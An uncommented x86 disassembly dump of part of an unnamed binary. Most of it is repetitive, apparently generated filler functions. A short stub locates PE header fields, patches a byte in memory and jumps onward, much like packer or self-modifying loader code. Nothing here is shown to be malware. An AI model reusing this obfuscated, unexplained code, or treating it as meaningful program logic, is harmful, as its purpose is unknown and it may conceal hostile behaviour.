  4d0788:	push   edx
  4d0789:	mov    eax,0x0
  4d078e:	push   eax
  4d078f:	call   0x4d1370
  4d0794:	add    esp,0x4
  4d0797:	pop    edx
  4d0798:	push   edx
  4d0799:	push   0x0
  4d079b:	call   0x4d0988
  4d07a0:	add    esp,0x4
  4d07a3:	pop    edx
  4d07a4:	add    esp,0x34
  4d07a7:	pop    ebp
  4d07a8:	ret    
  4d07a9:	add    BYTE PTR [eax],al
  4d07ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b1:	sub    esp,0x34
  4d07b4:	lea    esi,ds:0x4d3044
  4d07ba:	mov    DWORD PTR [ebp-0x8],0xffffff97
  4d07c1:	push   0x0
  4d07c3:	call   0x4d0988
  4d07c8:	add    esp,0x4
  4d07cb:	push   esi
  4d07cc:	push   DWORD PTR [esi+0x28]
  4d07cf:	push   DWORD PTR [esi+0x118]
  4d07d5:	push   DWORD PTR [esi+0x1a8]
  4d07db:	push   ebx
  4d07dc:	call   0x4d0d90
  4d07e1:	add    esp,0x10
  4d07e4:	pop    esi
  4d07e5:	mov    edx,0x0
  4d07ea:	push   edx
  4d07eb:	call   0x4d0cf0
  4d07f0:	add    esp,0x4
  4d07f3:	add    esp,0x34
  4d07f6:	pop    ebp
  4d07f7:	ret    
  4d07f8:	pop    edi
  4d07f9:	call   DWORD PTR ds:0x4d2008
  4d07ff:	call   edi
  4d0801:	add    BYTE PTR [eax],al
  4d0803:	add    BYTE PTR [edi-0x1],bl
  4d0806:	adc    eax,0x4d2074
  4d080b:	call   edi
  4d080d:	add    BYTE PTR [eax],al
  4d080f:	add    BYTE PTR [edi-0x1],bl
  4d0812:	adc    eax,0x4d2010
  4d0817:	call   edi
  4d0819:	add    BYTE PTR [eax],al
  4d081b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0821:	sub    esp,0x40
  4d0824:	mov    ebx,0x4d308c
  4d0829:	or     DWORD PTR [ebx+0xa4],0x1326
  4d0833:	push   ebx
  4d0834:	push   DWORD PTR [ebx+0x180]
  4d083a:	push   edi
  4d083b:	push   edi
  4d083c:	push   edi
  4d083d:	call   0x4d1238
  4d0842:	add    esp,0x10
  4d0845:	pop    ebx
  4d0846:	mov    ecx,0x0
  4d084b:	push   ecx
  4d084c:	call   0x4d075c
  4d0851:	add    esp,0x4
  4d0854:	call   0x4d07f8
  4d0859:	add    esp,0x4
  4d085c:	add    esp,0x40
  4d085f:	pop    ebp
  4d0860:	ret    
  4d0861:	add    BYTE PTR [eax],al
  4d0863:	add    BYTE PTR [edi-0x1],bl
  4d0866:	adc    eax,0x4d204c
  4d086b:	call   edi
  4d086d:	add    BYTE PTR [eax],al
  4d086f:	add    BYTE PTR [edi-0x1],bl
  4d0872:	adc    eax,0x4d2088
  4d0877:	call   edi
  4d0879:	add    BYTE PTR [eax],al
  4d087b:	add    BYTE PTR [edi-0x1],bl
  4d087e:	adc    eax,0x4d2024
  4d0883:	call   edi
  4d0885:	add    BYTE PTR [eax],al
  4d0887:	add    BYTE PTR [edi-0x1],bl
  4d088a:	adc    eax,0x4d2084
  4d088f:	call   edi
  4d0891:	add    BYTE PTR [eax],al
  4d0893:	add    BYTE PTR [edi-0x1],bl
  4d0896:	adc    eax,0x4d2028
  4d089b:	call   edi
  4d089d:	add    BYTE PTR [eax],al
  4d089f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08a5:	sub    esp,0x4c
  4d08a8:	lea    ebx,[eax-0x50]
  4d08ab:	adc    ecx,edx
  4d08ad:	mov    ecx,0x0
  4d08b2:	push   ecx
  4d08b3:	call   0x4d1280
  4d08b8:	add    esp,0x4
  4d08bb:	push   ebx
  4d08bc:	push   DWORD PTR [ebx+0x11c]
  4d08c2:	push   DWORD PTR [ebx+0x84]
  4d08c8:	push   DWORD PTR [ebx+0x70]
  4d08cb:	call   0x4d0bb8
  4d08d0:	add    esp,0xc
  4d08d3:	pop    ebx
  4d08d4:	mov    eax,0x0
  4d08d9:	push   eax
  4d08da:	call   0x4d0e64
  4d08df:	add    esp,0x4
  4d08e2:	add    esp,0x4c
  4d08e5:	pop    ebp
  4d08e6:	ret    
  4d08e7:	add    BYTE PTR [edi-0x1],bl
  4d08ea:	adc    eax,0x4d2034
  4d08ef:	call   edi
  4d08f1:	add    BYTE PTR [eax],al
  4d08f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08f9:	sub    esp,0x24
  4d08fc:	lea    ebx,[ecx-0xa8]
  4d0902:	or     DWORD PTR [ebx-0xe0],ebx
  4d0908:	push   ebx
  4d0909:	push   edx
  4d090a:	push   DWORD PTR [ebx+0x58]
  4d090d:	push   edi
  4d090e:	call   0x4d1194
  4d0913:	add    esp,0xc
  4d0916:	pop    ebx
  4d0917:	push   0x0
  4d0919:	call   0x4d1280
  4d091e:	add    esp,0x4
  4d0921:	mov    ecx,0x0
  4d0926:	push   ecx
  4d0927:	call   0x4d075c
  4d092c:	add    esp,0x4
  4d092f:	add    esp,0x24
  4d0932:	pop    ebp
  4d0933:	ret    
  4d0934:	pop    edi
  4d0935:	call   DWORD PTR ds:0x4d2080
  4d093b:	call   edi
  4d093d:	add    BYTE PTR [eax],al
  4d093f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0945:	sub    esp,0x48
  4d0948:	lea    esi,ds:0x4d30f4
  4d094e:	and    ecx,DWORD PTR [esi+0xcc]
  4d0954:	mov    ecx,0x0
  4d0959:	push   ecx
  4d095a:	call   0x4d0988
  4d095f:	add    esp,0x4
  4d0962:	push   esi
  4d0963:	push   DWORD PTR [esi+0x1a4]
  4d0969:	push   DWORD PTR [esi+0xc0]
  4d096f:	call   0x4d1328
  4d0974:	add    esp,0x8
  4d0977:	pop    esi
  4d0978:	push   0x0
  4d097a:	call   0x4d0ec0
  4d097f:	add    esp,0x4
  4d0982:	add    esp,0x48
  4d0985:	pop    ebp
  4d0986:	ret    
  4d0987:	add    BYTE PTR [edi-0x1],bl
  4d098a:	adc    eax,0x4d2040
  4d098f:	call   edi
  4d0991:	add    BYTE PTR [eax],al
  4d0993:	add    BYTE PTR [edi-0x1],bl
  4d0996:	adc    eax,0x4d2090
  4d099b:	call   edi
  4d099d:	add    BYTE PTR [eax],al
  4d099f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09a5:	sub    esp,0x5c
  4d09a8:	mov    esi,0x4d31fc
  4d09ad:	adc    DWORD PTR [esi-0x19c],0xffffff89
  4d09b4:	push   esi
  4d09b5:	push   DWORD PTR [esi+0x1f4]
  4d09bb:	push   DWORD PTR [esi+0x38]
  4d09be:	push   ecx
  4d09bf:	push   ebx
  4d09c0:	call   0x4d0768
  4d09c5:	add    esp,0x10
  4d09c8:	pop    esi
  4d09c9:	push   0x0
  4d09cb:	call   0x4d0ecc
  4d09d0:	add    esp,0x4
  4d09d3:	mov    ecx,0x0
  4d09d8:	push   ecx
  4d09d9:	call   0x4d1370
  4d09de:	add    esp,0x4
  4d09e1:	add    esp,0x5c
  4d09e4:	pop    ebp
  4d09e5:	ret    
  4d09e6:	add    BYTE PTR [eax],al
  4d09e8:	mov    edi,edi
  4d09ea:	push   ebp
  4d09eb:	mov    ebp,esp
  4d09ed:	sub    esp,0x2c
  4d09f0:	mov    esi,0x4d306c
  4d09f5:	cmp    esi,0x7492
  4d09fb:	jb     0x4d09eb
  4d09fd:	push   esi
  4d09fe:	push   DWORD PTR [esi+0xfc]
  4d0a04:	push   DWORD PTR [esi+0x17c]
  4d0a0a:	call   0x4d0f6c
  4d0a0f:	add    esp,0x8
  4d0a12:	pop    esi
  4d0a13:	mov    edi,0x0
  4d0a18:	push   edi
  4d0a19:	call   0x4d0ecc
  4d0a1e:	add    esp,0x4
  4d0a21:	mov    eax,0x0
  4d0a26:	push   eax
  4d0a27:	call   0x4d0894
  4d0a2c:	add    esp,0x4
  4d0a2f:	add    esp,0x2c
  4d0a32:	pop    ebp
  4d0a33:	ret    
  4d0a34:	pop    edi
  4d0a35:	call   DWORD PTR ds:0x4d2060
  4d0a3b:	call   edi
  4d0a3d:	add    BYTE PTR [eax],al
  4d0a3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a45:	sub    esp,0x54
  4d0a48:	mov    ecx,0x4d31bc
  4d0a4d:	cmp    ecx,0x69a0
  4d0a53:	jb     0x4d0a43
  4d0a55:	push   ecx
  4d0a56:	push   eax
  4d0a57:	push   edx
  4d0a58:	call   0x4d08f4
  4d0a5d:	add    esp,0x8
  4d0a60:	pop    ecx
  4d0a61:	push   ecx
  4d0a62:	push   0x0
  4d0a64:	call   0x4d0894
  4d0a69:	add    esp,0x4
  4d0a6c:	pop    ecx
  4d0a6d:	push   ecx
  4d0a6e:	push   0x0
  4d0a70:	call   0x4d0ecc
  4d0a75:	add    esp,0x4
  4d0a78:	pop    ecx
  4d0a79:	add    esp,0x54
  4d0a7c:	pop    ebp
  4d0a7d:	ret    
  4d0a7e:	add    BYTE PTR [eax],al
  4d0a80:	pop    edi
  4d0a81:	call   DWORD PTR ds:0x4d2000
  4d0a87:	call   edi
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a91:	sub    esp,0x58
  4d0a94:	lea    edx,[esi-0x10]
  4d0a97:	add    esi,ecx
  4d0a99:	push   edx
  4d0a9a:	push   DWORD PTR [edx+0x70]
  4d0a9d:	push   edi
  4d0a9e:	push   DWORD PTR [edx+0xe4]
  4d0aa4:	call   0x4d0a40
  4d0aa9:	add    esp,0xc
  4d0aac:	pop    edx
  4d0aad:	push   edx
  4d0aae:	mov    esi,0x0
  4d0ab3:	push   esi
  4d0ab4:	call   0x4d1370
  4d0ab9:	add    esp,0x4
  4d0abc:	pop    edx
  4d0abd:	push   edx
  4d0abe:	call   0x4d1500
  4d0ac3:	add    esp,0x4
  4d0ac6:	pop    edx
  4d0ac7:	add    esp,0x58
  4d0aca:	pop    ebp
  4d0acb:	ret    
  4d0acc:	pop    edi
  4d0acd:	call   DWORD PTR ds:0x4d203c
  4d0ad3:	call   edi
  4d0ad5:	add    BYTE PTR [eax],al
  4d0ad7:	add    BYTE PTR [edi+0x2b],dl
  4d0ada:	call   DWORD PTR [edi+0x57]
  4d0add:	push   edi
  4d0ade:	push   edi
  4d0adf:	call   0x4d08e8
  4d0ae4:	sub    esp,0xfffffffc
  4d0ae7:	call   0x4d06ec
  4d0aec:	push   0x2
  4d0aee:	xor    eax,eax
  4d0af0:	sub    eax,0x4d3030
  4d0af5:	neg    eax
  4d0af7:	push   0x0
  4d0af9:	lea    ecx,[eax+0x7]
  4d0afc:	add    BYTE PTR [ecx],0x41
  4d0aff:	push   eax
  4d0b00:	call   0x4d0750
  4d0b05:	pop    edi
  4d0b06:	pop    edi
  4d0b07:	pop    edi
  4d0b08:	lea    ecx,[eax+0x3b]
  4d0b0b:	mov    edi,DWORD PTR [ecx]
  4d0b0d:	lea    eax,[eax+edi*1]
  4d0b10:	mov    eax,DWORD PTR [eax+0x28]
  4d0b13:	pusha  
  4d0b14:	mov    ah,0x45
  4d0b16:	sub    al,ah
  4d0b18:	ja     0x4d0704
  4d0b1e:	popa   
  4d0b1f:	ret    
  4d0b20:	mov    edi,edi
  4d0b22:	push   ebp
  4d0b23:	mov    ebp,esp
  4d0b25:	sub    esp,0x1c
  4d0b28:	lea    edi,ds:0x4d30cc
  4d0b2e:	or     DWORD PTR [edi+0x68],0xffffffb6
  4d0b32:	push   edi
  4d0b33:	call   0x4d07f8
  4d0b38:	add    esp,0x4
  4d0b3b:	pop    edi
  4d0b3c:	push   edi
  4d0b3d:	push   DWORD PTR [edi+0x8c]
  4d0b43:	push   eax
  4d0b44:	push   ebx
  4d0b45:	call   0x4d1544
  4d0b4a:	add    esp,0xc
  4d0b4d:	pop    edi
  4d0b4e:	push   edi
  4d0b4f:	call   0x4d07f8
  4d0b54:	add    esp,0x4
  4d0b57:	pop    edi
  4d0b58:	add    esp,0x1c
  4d0b5b:	pop    ebp
  4d0b5c:	ret    
  4d0b5d:	add    BYTE PTR [eax],al
  4d0b5f:	add    BYTE PTR [edi-0x1],bl
  4d0b62:	adc    eax,0x4d205c
  4d0b67:	call   edi
  4d0b69:	add    BYTE PTR [eax],al
  4d0b6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b71:	sub    esp,0x2c
  4d0b74:	lea    edi,ds:0x4d31e0
  4d0b7a:	cmp    edi,0x195b
  4d0b80:	jbe    0x4d0b6f
  4d0b82:	push   edi
  4d0b83:	push   0x0
  4d0b85:	call   0x4d1370
  4d0b8a:	add    esp,0x4
  4d0b8d:	pop    edi
  4d0b8e:	push   edi
  4d0b8f:	push   DWORD PTR [edi+0x80]
  4d0b95:	push   DWORD PTR [edi+0x1a8]
  4d0b9b:	push   ecx
  4d0b9c:	call   0x4d1078
  4d0ba1:	add    esp,0xc
  4d0ba4:	pop    edi
  4d0ba5:	push   edi
  4d0ba6:	push   0x0
  4d0ba8:	call   0x4d0e64
  4d0bad:	add    esp,0x4
  4d0bb0:	pop    edi
  4d0bb1:	add    esp,0x2c
  4d0bb4:	pop    ebp
  4d0bb5:	ret    
  4d0bb6:	add    BYTE PTR [eax],al
  4d0bb8:	mov    edi,edi
  4d0bba:	push   ebp
  4d0bbb:	mov    ebp,esp
  4d0bbd:	sub    esp,0x3c
  4d0bc0:	lea    esi,[ebx+0xb8]
  4d0bc6:	or     DWORD PTR [esi-0x168],eax
  4d0bcc:	push   esi
  4d0bcd:	push   DWORD PTR [esi+0x10c]
  4d0bd3:	push   DWORD PTR [esi+0x130]
  4d0bd9:	push   edx
  4d0bda:	push   DWORD PTR [esi+0x174]
  4d0be0:	call   0x4d0e18
  4d0be5:	add    esp,0x10
  4d0be8:	pop    esi
  4d0be9:	mov    ecx,0x0
  4d0bee:	push   ecx
  4d0bef:	call   0x4d0cf0
  4d0bf4:	add    esp,0x4
  4d0bf7:	call   0x4d07f8
  4d0bfc:	add    esp,0x4
  4d0bff:	add    esp,0x3c
  4d0c02:	pop    ebp
  4d0c03:	ret    
  4d0c04:	mov    edi,edi
  4d0c06:	push   ebp
  4d0c07:	mov    ebp,esp
  4d0c09:	sub    esp,0x2c
  4d0c0c:	mov    esi,0x4d31f4
  4d0c11:	cmp    esi,0xa54
  4d0c17:	je     0x4d0c07
  4d0c19:	push   esi
  4d0c1a:	push   ebx
  4d0c1b:	push   DWORD PTR [esi+0x1e0]
  4d0c21:	push   DWORD PTR [esi+0x2c]
  4d0c24:	push   eax
  4d0c25:	call   0x4d081c
  4d0c2a:	add    esp,0x10
  4d0c2d:	pop    esi
  4d0c2e:	push   0x0
  4d0c30:	call   0x4d1370
  4d0c35:	add    esp,0x4
  4d0c38:	mov    ebx,0xfffffff4
  4d0c3d:	push   ebx
  4d0c3e:	call   0x4d0ce4
  4d0c43:	add    esp,0x4
  4d0c46:	add    esp,0x2c
  4d0c49:	pop    ebp
  4d0c4a:	ret    
  4d0c4b:	add    BYTE PTR [edi-0x1],bl
  4d0c4e:	adc    eax,0x4d2048
  4d0c53:	call   edi
  4d0c55:	add    BYTE PTR [eax],al
  4d0c57:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c5d:	sub    esp,0x20
  4d0c60:	mov    ebx,0x4d31a0
  4d0c65:	or     ecx,ebx
  4d0c67:	push   0x0
  4d0c69:	call   0x4d0ecc
  4d0c6e:	add    esp,0x4
  4d0c71:	push   ebx
  4d0c72:	push   DWORD PTR [ebx+0x10c]
  4d0c78:	push   ecx
  4d0c79:	push   DWORD PTR [ebx+0x1d0]
  4d0c7f:	push   eax
  4d0c80:	call   0x4d0f20
  4d0c85:	add    esp,0x10
  4d0c88:	pop    ebx
  4d0c89:	push   0x0
  4d0c8b:	call   0x4d0894
  4d0c90:	add    esp,0x4
  4d0c93:	add    esp,0x20
  4d0c96:	pop    ebp
  4d0c97:	ret    
  4d0c98:	pop    edi
  4d0c99:	call   DWORD PTR ds:0x4d20a0
  4d0c9f:	call   edi
  4d0ca1:	add    BYTE PTR [eax],al
  4d0ca3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ca9:	sub    esp,0x44
  4d0cac:	lea    edx,[ecx-0x9c]
  4d0cb2:	xor    edi,DWORD PTR [edx+0x54]
  4d0cb5:	push   edx
  4d0cb6:	call   0x4d08e8
  4d0cbb:	add    esp,0x4
  4d0cbe:	pop    edx
  4d0cbf:	push   edx
  4d0cc0:	push   ebx
  4d0cc1:	push   DWORD PTR [edx+0x98]
  4d0cc7:	call   0x4d09e8
  4d0ccc:	add    esp,0x8
  4d0ccf:	pop    edx
  4d0cd0:	push   edx
  4d0cd1:	push   0x0
  4d0cd3:	call   0x4d0e64
  4d0cd8:	add    esp,0x4
  4d0cdb:	pop    edx
  4d0cdc:	add    esp,0x44
  4d0cdf:	pop    ebp
  4d0ce0:	ret    
  4d0ce1:	add    BYTE PTR [eax],al
  4d0ce3:	add    BYTE PTR [edi-0x1],bl
  4d0ce6:	adc    eax,0x4d2044
  4d0ceb:	call   edi
  4d0ced:	add    BYTE PTR [eax],al
  4d0cef:	add    BYTE PTR [edi-0x1],bl
  4d0cf2:	adc    eax,0x4d2030
  4d0cf7:	call   edi
  4d0cf9:	add    BYTE PTR [eax],al
  4d0cfb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d01:	sub    esp,0x48
  4d0d04:	lea    edi,ds:0x4d3150
  4d0d0a:	xor    DWORD PTR [edi+0x6c],ebx
  4d0d0d:	push   edi
  4d0d0e:	push   edx
  4d0d0f:	push   DWORD PTR [edi+0x1bc]
  4d0d15:	call   0x4d12d4
  4d0d1a:	add    esp,0x8
  4d0d1d:	pop    edi
  4d0d1e:	push   edi
  4d0d1f:	mov    ecx,0x0
  4d0d24:	push   ecx
  4d0d25:	call   0x4d0a80
  4d0d2a:	add    esp,0x4
  4d0d2d:	pop    edi
  4d0d2e:	push   edi
  4d0d2f:	call   0x4d1500
  4d0d34:	add    esp,0x4
  4d0d37:	pop    edi
  4d0d38:	add    esp,0x48
  4d0d3b:	pop    ebp
  4d0d3c:	ret    
  4d0d3d:	add    BYTE PTR [eax],al
  4d0d3f:	add    BYTE PTR [edi-0x1],bl
  4d0d42:	adc    eax,0x4d2004
  4d0d47:	call   edi
  4d0d49:	add    BYTE PTR [eax],al
  4d0d4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d51:	sub    esp,0x2c
  4d0d54:	lea    ecx,ds:0x4d3120
  4d0d5a:	cmp    ecx,0x58ef
  4d0d60:	je     0x4d0d4f
  4d0d62:	push   ecx
  4d0d63:	push   edx
  4d0d64:	push   DWORD PTR [ecx+0x40]
  4d0d67:	call   0x4d0cfc
  4d0d6c:	add    esp,0x8
  4d0d6f:	pop    ecx
  4d0d70:	push   ecx
  4d0d71:	call   0x4d07f8
  4d0d76:	add    esp,0x4
  4d0d79:	pop    ecx
  4d0d7a:	push   ecx
  4d0d7b:	mov    edi,0x0
  4d0d80:	push   edi
  4d0d81:	call   0x4d075c
  4d0d86:	add    esp,0x4
  4d0d89:	pop    ecx
  4d0d8a:	add    esp,0x2c
  4d0d8d:	pop    ebp
  4d0d8e:	ret    
  4d0d8f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d95:	sub    esp,0x5c
  4d0d98:	lea    eax,[esi+0x54]
  4d0d9b:	add    ebx,edi
  4d0d9d:	push   eax
  4d0d9e:	push   0x0
  4d0da0:	call   0x4d0894
  4d0da5:	add    esp,0x4
  4d0da8:	pop    eax
  4d0da9:	push   eax
  4d0daa:	push   ecx
  4d0dab:	push   DWORD PTR [eax+0x90]
  4d0db1:	push   DWORD PTR [eax+0x118]
  4d0db7:	call   0x4d0d4c
  4d0dbc:	add    esp,0xc
  4d0dbf:	pop    eax
  4d0dc0:	push   eax
  4d0dc1:	call   0x4d08e8
  4d0dc6:	add    esp,0x4
  4d0dc9:	pop    eax
  4d0dca:	add    esp,0x5c
  4d0dcd:	pop    ebp
  4d0dce:	ret    
  4d0dcf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dd5:	sub    esp,0x50
  4d0dd8:	lea    esi,[eax-0x48]
  4d0ddb:	and    edi,DWORD PTR [esi+0x9c]
  4d0de1:	mov    ecx,0x0
  4d0de6:	push   ecx
  4d0de7:	call   0x4d1280
  4d0dec:	add    esp,0x4
  4d0def:	push   esi
  4d0df0:	push   ebx
  4d0df1:	push   DWORD PTR [esi+0x17c]
  4d0df7:	push   DWORD PTR [esi+0x124]
  4d0dfd:	call   0x4d0a8c
  4d0e02:	add    esp,0xc
  4d0e05:	pop    esi
  4d0e06:	push   0x0
  4d0e08:	call   0x4d0ec0
  4d0e0d:	add    esp,0x4
  4d0e10:	add    esp,0x50
  4d0e13:	pop    ebp
  4d0e14:	ret    
  4d0e15:	add    BYTE PTR [eax],al
  4d0e17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e1d:	sub    esp,0x30
  4d0e20:	lea    edi,ds:0x4d3130
  4d0e26:	and    DWORD PTR [edi+0x68],0x37
  4d0e2a:	push   edi
  4d0e2b:	push   DWORD PTR [edi+0x1dc]
  4d0e31:	push   ebx
  4d0e32:	push   DWORD PTR [edi+0x1d8]
  4d0e38:	push   DWORD PTR [edi+0x168]
  4d0e3e:	call   0x4d09a0
  4d0e43:	add    esp,0x10
  4d0e46:	pop    edi
  4d0e47:	push   edi
  4d0e48:	call   0x4d08e8
  4d0e4d:	add    esp,0x4
  4d0e50:	pop    edi
  4d0e51:	push   edi
  4d0e52:	push   0x0
  4d0e54:	call   0x4d1370
  4d0e59:	add    esp,0x4
  4d0e5c:	pop    edi
  4d0e5d:	add    esp,0x30
  4d0e60:	pop    ebp
  4d0e61:	ret    
  4d0e62:	add    BYTE PTR [eax],al
  4d0e64:	pop    edi
  4d0e65:	call   DWORD PTR ds:0x4d2020
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [edi-0x1],bl
  4d0e72:	adc    eax,0x4d2098
  4d0e77:	call   edi
  4d0e79:	add    BYTE PTR [eax],al
  4d0e7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e81:	sub    esp,0x34
  4d0e84:	lea    esi,[ebx+0x14]
  4d0e87:	and    DWORD PTR [esi+0x16c],0x25
  4d0e8e:	push   esi
  4d0e8f:	push   DWORD PTR [esi+0x13c]
  4d0e95:	push   DWORD PTR [esi+0xdc]
  4d0e9b:	push   DWORD PTR [esi+0xb4]
  4d0ea1:	call   0x4d1154
  4d0ea6:	add    esp,0xc
  4d0ea9:	pop    esi
  4d0eaa:	call   0x4d08e8
  4d0eaf:	add    esp,0x4
  4d0eb2:	call   0x4d1500
  4d0eb7:	add    esp,0x4
  4d0eba:	add    esp,0x34
  4d0ebd:	pop    ebp
  4d0ebe:	ret    
  4d0ebf:	add    BYTE PTR [edi-0x1],bl
  4d0ec2:	adc    eax,0x4d2068
  4d0ec7:	call   edi
  4d0ec9:	add    BYTE PTR [eax],al
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d206c
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x1c
  4d0ee0:	mov    eax,0x4d3100
  4d0ee5:	and    DWORD PTR [ebp-0x14],ebx
  4d0ee8:	push   eax
  4d0ee9:	push   DWORD PTR [eax+0x2c]
  4d0eec:	push   DWORD PTR [eax+0x178]
  4d0ef2:	push   DWORD PTR [eax+0x1e4]
  4d0ef8:	call   0x4d08a0
  4d0efd:	add    esp,0xc
  4d0f00:	pop    eax
  4d0f01:	push   eax
  4d0f02:	push   0x0
  4d0f04:	call   0x4d075c
  4d0f09:	add    esp,0x4
  4d0f0c:	pop    eax
  4d0f0d:	push   eax
  4d0f0e:	push   0x0
  4d0f10:	call   0x4d0988
  4d0f15:	add    esp,0x4
  4d0f18:	pop    eax
  4d0f19:	add    esp,0x1c
  4d0f1c:	pop    ebp
  4d0f1d:	ret    
  4d0f1e:	add    BYTE PTR [eax],al
  4d0f20:	mov    edi,edi
  4d0f22:	push   ebp
  4d0f23:	mov    ebp,esp
  4d0f25:	sub    esp,0x44
  4d0f28:	lea    ecx,ds:0x4d3140
  4d0f2e:	or     eax,0x76b1
  4d0f33:	push   ecx
  4d0f34:	push   DWORD PTR [ecx+0x90]
  4d0f3a:	push   edi
  4d0f3b:	push   eax
  4d0f3c:	push   DWORD PTR [ecx+0x170]
  4d0f42:	call   0x4d158c
  4d0f47:	add    esp,0x10
  4d0f4a:	pop    ecx
  4d0f4b:	push   ecx
  4d0f4c:	call   0x4d1500
  4d0f51:	add    esp,0x4
  4d0f54:	pop    ecx
  4d0f55:	push   ecx
  4d0f56:	mov    edi,0x0
  4d0f5b:	push   edi
  4d0f5c:	call   0x4d0894
  4d0f61:	add    esp,0x4
  4d0f64:	pop    ecx
  4d0f65:	add    esp,0x44
  4d0f68:	pop    ebp
  4d0f69:	ret    
  4d0f6a:	add    BYTE PTR [eax],al
  4d0f6c:	mov    edi,edi
  4d0f6e:	push   ebp
  4d0f6f:	mov    ebp,esp
  4d0f71:	sub    esp,0x3c
  4d0f74:	lea    edx,[esi+0x90]
  4d0f7a:	sbb    DWORD PTR [edx-0xa4],ecx
  4d0f80:	push   edx
  4d0f81:	lea    ebx,[edx-0xfc]
  4d0f87:	push   ebx
  4d0f88:	call   0x4d0acc
  4d0f8d:	add    esp,0x4
  4d0f90:	test   eax,eax
  4d0f92:	jne    0x4d0f81
  4d0f94:	pop    edx
  4d0f95:	push   edx
  4d0f96:	push   edi
  4d0f97:	push   ecx
  4d0f98:	push   eax
  4d0f99:	call   0x4d1418
  4d0f9e:	add    esp,0xc
  4d0fa1:	pop    edx
  4d0fa2:	push   edx
  4d0fa3:	mov    esi,0x0
  4d0fa8:	push   esi
  4d0fa9:	call   0x4d0988
  4d0fae:	add    esp,0x4
  4d0fb1:	pop    edx
  4d0fb2:	add    esp,0x3c
  4d0fb5:	pop    ebp
  4d0fb6:	ret    
  4d0fb7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fbd:	sub    esp,0x40
  4d0fc0:	mov    edx,0x4d3124
  4d0fc5:	add    ebx,0xffffff8b
  4d0fc8:	push   edx
  4d0fc9:	mov    eax,0x0
  4d0fce:	push   eax
  4d0fcf:	call   0x4d0988
  4d0fd4:	add    esp,0x4
  4d0fd7:	pop    edx
  4d0fd8:	push   edx
  4d0fd9:	push   DWORD PTR [edx+0xe4]
  4d0fdf:	push   DWORD PTR [edx+0x174]
  4d0fe5:	push   eax
  4d0fe6:	push   ecx
  4d0fe7:	call   0x4d128c
  4d0fec:	add    esp,0x10
  4d0fef:	pop    edx
  4d0ff0:	push   edx
  4d0ff1:	mov    ecx,0x0
  4d0ff6:	push   ecx
  4d0ff7:	call   0x4d0a80
  4d0ffc:	add    esp,0x4
  4d0fff:	pop    edx
  4d1000:	add    esp,0x40
  4d1003:	pop    ebp
  4d1004:	ret    
  4d1005:	add    BYTE PTR [eax],al
  4d1007:	add    BYTE PTR [edi-0x1],bl
  4d100a:	adc    eax,0x4d2064
  4d100f:	call   edi
  4d1011:	add    BYTE PTR [eax],al
  4d1013:	add    BYTE PTR [edi-0x1],bl
  4d1016:	adc    eax,0x4d2054
  4d101b:	call   edi
  4d101d:	add    BYTE PTR [eax],al
  4d101f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1025:	sub    esp,0x50
  4d1028:	lea    ecx,ds:0x4d30e8
  4d102e:	cmp    ecx,0x49b3
  4d1034:	je     0x4d1023
  4d1036:	push   ecx
  4d1037:	push   DWORD PTR [ecx+0x140]
  4d103d:	push   DWORD PTR [ecx+0x198]
  4d1043:	call   0x4d11e4
  4d1048:	add    esp,0x8
  4d104b:	pop    ecx
  4d104c:	push   ecx
  4d104d:	mov    ecx,0xfffffff4
  4d1052:	push   ecx
  4d1053:	call   0x4d0ce4
  4d1058:	add    esp,0x4
  4d105b:	pop    ecx
  4d105c:	push   ecx
  4d105d:	lea    eax,[ecx-0xe8]
  4d1063:	push   eax
  4d1064:	call   0x4d0acc
  4d1069:	add    esp,0x4
  4d106c:	test   eax,eax
  4d106e:	jne    0x4d105d
  4d1070:	pop    ecx
  4d1071:	add    esp,0x50
  4d1074:	pop    ebp
  4d1075:	ret    
  4d1076:	add    BYTE PTR [eax],al
  4d1078:	mov    edi,edi
  4d107a:	push   ebp
  4d107b:	mov    ebp,esp
  4d107d:	sub    esp,0x38
  4d1080:	mov    eax,0x4d3150
  4d1085:	xor    ecx,edi
  4d1087:	push   eax
  4d1088:	push   DWORD PTR [eax+0xac]
  4d108e:	push   edi
  4d108f:	push   ecx
  4d1090:	call   0x4d1468
  4d1095:	add    esp,0xc
  4d1098:	pop    eax
  4d1099:	push   eax
  4d109a:	push   0x0
  4d109c:	call   0x4d0988
  4d10a1:	add    esp,0x4
  4d10a4:	pop    eax
  4d10a5:	push   eax
  4d10a6:	mov    eax,0x0
  4d10ab:	push   eax
  4d10ac:	call   0x4d1280
  4d10b1:	add    esp,0x4
  4d10b4:	pop    eax
  4d10b5:	add    esp,0x38
  4d10b8:	pop    ebp
  4d10b9:	ret    
  4d10ba:	add    BYTE PTR [eax],al
  4d10bc:	mov    edi,edi
  4d10be:	push   ebp
  4d10bf:	mov    ebp,esp
  4d10c1:	sub    esp,0x54
  4d10c4:	add    edi,0xffffc42f
  4d10ca:	lea    ebx,[edx+0x38]
  4d10cd:	mov    esi,0x6ac
  4d10d2:	push   esi
  4d10d3:	mov    ecx,0x6ac
  4d10d8:	push   ecx
  4d10d9:	push   0x40001
  4d10de:	mov    edi,0x862985c2
